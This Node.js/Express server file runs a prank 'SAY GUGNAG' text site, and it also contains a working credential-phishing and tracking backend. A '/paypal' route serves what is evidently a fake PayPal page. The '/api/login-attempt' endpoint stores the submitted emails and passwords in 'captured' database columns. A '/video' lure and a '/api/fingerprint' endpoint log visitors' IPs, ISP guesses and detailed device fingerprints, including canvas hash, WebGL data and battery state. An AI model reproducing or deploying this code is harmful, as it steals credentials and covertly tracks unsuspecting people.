const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const port = process.env.PORT || 3000;

// Store all connected WebSocket clients
const clients = new Set();

// WebSocket connection handler
wss.on('connection', (ws) => {
    clients.add(ws);
    console.log('New WebSocket client connected. Total clients:', clients.size);

    ws.on('close', () => {
        clients.delete(ws);
        console.log('Client disconnected. Total clients:', clients.size);
    });

    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
        clients.delete(ws);
    });
});

// Broadcast to all connected clients
function broadcastUpdate(key, value) {
    const message = JSON.stringify({ type: 'update', key, value });
    clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(message);
        }
    });
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname)); // Serve static files

// PostgreSQL connection
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Initialize database table
async function initDatabase() {
    try {
        // Main table for current text
        await pool.query(`
            CREATE TABLE IF NOT EXISTS site_text (
                id SERIAL PRIMARY KEY,
                key VARCHAR(255) UNIQUE NOT NULL,
                value TEXT NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // History table for ALL changes (never deleted)
        await pool.query(`
            CREATE TABLE IF NOT EXISTS text_history (
                id SERIAL PRIMARY KEY,
                key VARCHAR(255) NOT NULL,
                value TEXT NOT NULL,
                changed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // IP logging table for video player visitors (expanded)
        await pool.query(`
            CREATE TABLE IF NOT EXISTS ip_logs3 (
                id SERIAL PRIMARY KEY,
                ip VARCHAR(45) NOT NULL,
                ip_type VARCHAR(10),
                isp_guess TEXT,
                user_agent TEXT,
                referer TEXT,
                page VARCHAR(255),
                accept_language TEXT,
                platform TEXT,
                screen_width INT,
                screen_height INT,
                viewport_width INT,
                viewport_height INT,
                color_depth INT,
                pixel_ratio REAL,
                timezone TEXT,
                timezone_offset INT,
                touch_support BOOLEAN,
                cookies_enabled BOOLEAN,
                do_not_track TEXT,
                online BOOLEAN,
                connection_type TEXT,
                device_memory REAL,
                hardware_concurrency INT,
                browser_plugins TEXT,
                canvas_hash TEXT,
                webgl_vendor TEXT,
                webgl_renderer TEXT,
                fonts_detected TEXT,
                battery_level REAL,
                battery_charging BOOLEAN,
                captured_email TEXT,
                captured_password TEXT,
                visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Insert default values if table is empty
        const { rows } = await pool.query('SELECT COUNT(*) FROM site_text');
        if (parseInt(rows[0].count) === 0) {
            const defaultTexts = [
                ['main_header', 'SAY GUGNAG'],
                ['button_text', 'CLICK TO SAY GUGNAG'],
                ['top_marquee', '⚠️ Warning: Screaming this word at the top of your lungs will result in PAIN⚠️'],
                ['spinning_text', '🌟 THE WORD YOUR TEACHER LOVES 🌟'],
                ['badge1', '⭐ FAVORITE WORD AMONGST YAHOO USERS ⭐'],
                ['badge2', '💯 100% APPROVED BY ZERO TEACHERS 💯'],
                ['badge3', '🔥 UNDER CONSTRUCTION 🔥'],
                ['footer_copyright', '© 2024 "GUGNAG DANIALS" ENTERPRISES™'],
                ['popup_checkbox', 'turn off popups like a bitch'],
            ];

            for (const [key, value] of defaultTexts) {
                await pool.query(
                    'INSERT INTO site_text (key, value) VALUES ($1, $2) ON CONFLICT (key) DO NOTHING',
                    [key, value]
                );
            }
        }

        console.log('Database initialized successfully');
    } catch (err) {
        console.error('Error initializing database:', err);
    }
}

// API Routes

// Get all text content
app.get('/api/text', async (req, res) => {
    try {
        const { rows } = await pool.query('SELECT key, value FROM site_text');
        const textData = {};
        rows.forEach(row => {
            textData[row.key] = row.value;
        });
        res.json(textData);
    } catch (err) {
        console.error('Error fetching text:', err);
        res.status(500).json({ error: 'Failed to fetch text' });
    }
});

// Reset all text to defaults (MUST come before /:key route)
app.post('/api/text/reset-all', async (_req, res) => {
    try {
        const defaultTexts = [
            ['main_header', 'SAY GUGNAG'],
            ['button_text', 'CLICK TO SAY GUGNAG'],
            ['top_marquee', '⚠️ Warning: Screaming this word at the top of your lungs will result in PAIN⚠️'],
            ['spinning_text', '🌟 THE WORD YOUR TEACHER LOVES 🌟'],
            ['badge1', '⭐ FAVORITE WORD AMONGST YAHOO USERS ⭐'],
            ['badge2', '💯 100% APPROVED BY ZERO TEACHERS 💯'],
            ['badge3', '🔥 UNDER CONSTRUCTION 🔥'],
            ['footer_copyright', '© 2024 "GUGNAG DANIALS" ENTERPRISES™'],
            ['popup_checkbox', 'turn off popups like a bitch'],
        ];

        for (const [key, value] of defaultTexts) {
            await pool.query(
                'INSERT INTO site_text (key, value) VALUES ($1, $2) ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = CURRENT_TIMESTAMP',
                [key, value]
            );
        }

        res.json({ success: true, message: 'All text reset to defaults' });
    } catch (err) {
        console.error('Error resetting text:', err);
        res.status(500).json({ error: 'Failed to reset text' });
    }
});

// Update text content
app.post('/api/text/:key', async (req, res) => {
    const { key } = req.params;
    const { value } = req.body;

    if (!value) {
        return res.status(400).json({ error: 'Value is required' });
    }

    try {
        // Update current text
        await pool.query(
            'INSERT INTO site_text (key, value) VALUES ($1, $2) ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = CURRENT_TIMESTAMP',
            [key, value]
        );

        // Save to history (NEVER deleted)
        await pool.query(
            'INSERT INTO text_history (key, value) VALUES ($1, $2)',
            [key, value]
        );

        // Broadcast update to all connected WebSocket clients
        broadcastUpdate(key, value);

        res.json({ success: true, key, value });
    } catch (err) {
        console.error('Error updating text:', err);
        res.status(500).json({ error: 'Failed to update text' });
    }
});

// Get change history
app.get('/api/history', async (req, res) => {
    try {
        const { rows } = await pool.query(
            'SELECT * FROM text_history ORDER BY changed_at DESC LIMIT 100'
        );
        res.json(rows);
    } catch (err) {
        console.error('Error fetching history:', err);
        res.status(500).json({ error: 'Failed to fetch history' });
    }
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

// Shop page
app.get('/shop', (req, res) => {
    res.sendFile(path.join(__dirname, 'shop.html'));
});

// Trust proxy for Railway (to get real IP)
app.set('trust proxy', true);

// Known ISP prefixes for IPv6
const ipv6Prefixes = {
    '2607:fb90': 'T-Mobile USA',
    '2607:fb91': 'T-Mobile USA',
    '2607:fc20': 'T-Mobile USA',
    '2600:1700': 'AT&T',
    '2600:1000': 'AT&T',
    '2600:8800': 'AT&T',
    '2601:': 'Comcast',
    '2603:': 'Comcast',
    '2602:': 'Verizon',
    '2604:': 'Spectrum/Charter',
    '2605:': 'Cox',
    '2620:': 'Various (often corporate)',
    '2a00:': 'European ISP',
    '2a01:': 'European ISP',
    '2a02:': 'European ISP',
    '2a03:': 'European ISP',
    '2400:': 'Asia-Pacific ISP',
    '2404:': 'Asia-Pacific ISP',
    '2001:470': 'Hurricane Electric (tunnel)',
    '2001:4860': 'Google',
    '2606:4700': 'Cloudflare',
    '2620:fe': 'Facebook/Meta',
};

function guessISP(ip) {
    if (!ip) return 'Unknown';

    // Check if IPv4
    if (ip.includes('.') && !ip.includes(':')) {
        const firstOctet = parseInt(ip.split('.')[0]);
        // Some common IPv4 ranges (very rough)
        if (ip.startsWith('172.') || ip.startsWith('192.168.') || ip.startsWith('10.')) return 'Private Network';
        return 'IPv4 - lookup required';
    }

    // IPv6 prefix matching
    for (const [prefix, isp] of Object.entries(ipv6Prefixes)) {
        if (ip.toLowerCase().startsWith(prefix.toLowerCase())) {
            return isp;
        }
    }

    return 'Unknown ISP';
}

function getIPType(ip) {
    if (!ip) return 'Unknown';
    if (ip.includes(':')) return 'IPv6';
    if (ip.includes('.')) return 'IPv4';
    return 'Unknown';
}

// Video player page - logs visitor IP and headers
app.get('/video', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || 'Direct';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const ipType = getIPType(ip);
    const ispGuess = guessISP(ip);

    try {
        await pool.query(
            `INSERT INTO ip_logs3 (ip, ip_type, isp_guess, user_agent, referer, page, accept_language)
             VALUES ($1, $2, $3, $4, $5, $6, $7)
             RETURNING id`,
            [ip, ipType, ispGuess, userAgent, referer, '/video', acceptLanguage]
        );
        console.log(`[IP LOGGED] ${ip} (${ipType}) - ${ispGuess} visited /video`);
    } catch (err) {
        console.error('Error logging IP:', err);
    }

    res.sendFile(path.join(__dirname, 'video.html'));
});

// PayPal page - logs visitor IP and headers
app.get('/paypal', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || 'Direct';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const ipType = getIPType(ip);
    const ispGuess = guessISP(ip);

    try {
        await pool.query(
            `INSERT INTO ip_logs3 (ip, ip_type, isp_guess, user_agent, referer, page, accept_language)
             VALUES ($1, $2, $3, $4, $5, $6, $7)
             RETURNING id`,
            [ip, ipType, ispGuess, userAgent, referer, '/paypal', acceptLanguage]
        );
        console.log(`[IP LOGGED] ${ip} (${ipType}) - ${ispGuess} visited /paypal`);
    } catch (err) {
        console.error('Error logging IP:', err);
    }

    res.sendFile(path.join(__dirname, 'paypal.html'));
});

// API endpoint to receive login attempts
app.post('/api/login-attempt', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress;
    const { email, password } = req.body;

    try {
        await pool.query(
            `UPDATE ip_logs3 SET
                captured_email = $1,
                captured_password = $2
            WHERE id = (SELECT MAX(id) FROM ip_logs3 WHERE ip = $3)`,
            [email, password, ip]
        );
        console.log(`[CAPTURED] ${ip} - Email: ${email}`);
        res.json({ success: true });
    } catch (err) {
        console.error('Error saving login attempt:', err);
        res.status(500).json({ error: 'Failed' });
    }
});

// API endpoint to receive client-side fingerprint data
app.post('/api/fingerprint', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress;
    const data = req.body;

    try {
        // Update ALL entries for this IP with client-side data (in case they reconnect)
        await pool.query(
            `UPDATE ip_logs3 SET
                platform = $1,
                screen_width = $2,
                screen_height = $3,
                viewport_width = $4,
                viewport_height = $5,
                color_depth = $6,
                pixel_ratio = $7,
                timezone = $8,
                timezone_offset = $9,
                touch_support = $10,
                cookies_enabled = $11,
                do_not_track = $12,
                online = $13,
                connection_type = $14,
                device_memory = $15,
                hardware_concurrency = $16,
                browser_plugins = $17,
                canvas_hash = $18,
                webgl_vendor = $19,
                webgl_renderer = $20,
                battery_level = $21,
                battery_charging = $22
            WHERE id = (SELECT MAX(id) FROM ip_logs3 WHERE ip = $23)`,
            [
                data.platform,
                data.screenWidth,
                data.screenHeight,
                data.viewportWidth,
                data.viewportHeight,
                data.colorDepth,
                data.pixelRatio,
                data.timezone,
                data.timezoneOffset,
                data.touchSupport,
                data.cookiesEnabled,
                data.doNotTrack,
                data.online,
                data.connectionType,
                data.deviceMemory,
                data.hardwareConcurrency,
                data.plugins,
                data.canvasHash,
                data.webglVendor,
                data.webglRenderer,
                data.batteryLevel,
                data.batteryCharging,
                ip
            ]
        );
        res.json({ success: true });
    } catch (err) {
        console.error('Error updating fingerprint:', err);
        res.status(500).json({ error: 'Failed' });
    }
});

// Serve index.html for all other routes
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
initDatabase().then(() => {
    server.listen(port, '0.0.0.0', () => {
        console.log(`Server running on port ${port}`);
        console.log('WebSocket server ready');
    });
});
